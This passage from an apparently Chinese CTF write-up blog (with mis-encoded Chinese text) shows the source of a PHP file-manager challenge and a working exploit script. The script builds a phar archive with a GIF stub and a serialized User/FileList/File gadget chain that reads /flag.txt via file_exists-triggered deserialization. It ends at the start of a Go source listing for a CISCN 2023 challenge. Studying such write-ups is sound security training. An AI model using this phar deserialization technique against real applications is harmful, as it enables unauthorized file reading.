class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>download.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰delete.phpæ¥è§¦å‘file_existsç„¶åè§¦å‘ååºåˆ—åŒ–,</p><p> åŸå› æ˜¯åœ¨downloadä¸­è®¾ç½®äº†open_basedir</p><blockquote><p><code>open_basedir</code> æ˜¯ PHP çš„ä¸€ä¸ªå®‰å…¨ç‰¹æ€§ï¼Œç”¨äºé™åˆ¶ PHP è„šæœ¬å¯¹æ–‡ä»¶ç³»ç»Ÿçš„è®¿é—®èŒƒå›´ã€‚å½“ <code>open_basedir</code> é…ç½®è®¾ç½®ä¸ºæŸä¸ªç›®å½•æ—¶ï¼ŒPHP è„šæœ¬åªèƒ½è®¿é—®è¯¥ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œè€Œä¸èƒ½è®¿é—®å…¶ä»–ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF86a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315155224020.png" alt="image-20240315155224020"></p><h2 id="CISCN-2023-åˆèµ›-go-session"><a href="#CISCN-2023-åˆèµ›-go-session" class="headerlink" title="[CISCN 2023 åˆèµ›]go_session"></a>[CISCN 2023 åˆèµ›]go_session</h2><p>ç¬¬ä¸€æ¬¡åšgoå®¡è®¡,å…ˆçœ‹æºç </p><p>main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>route.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 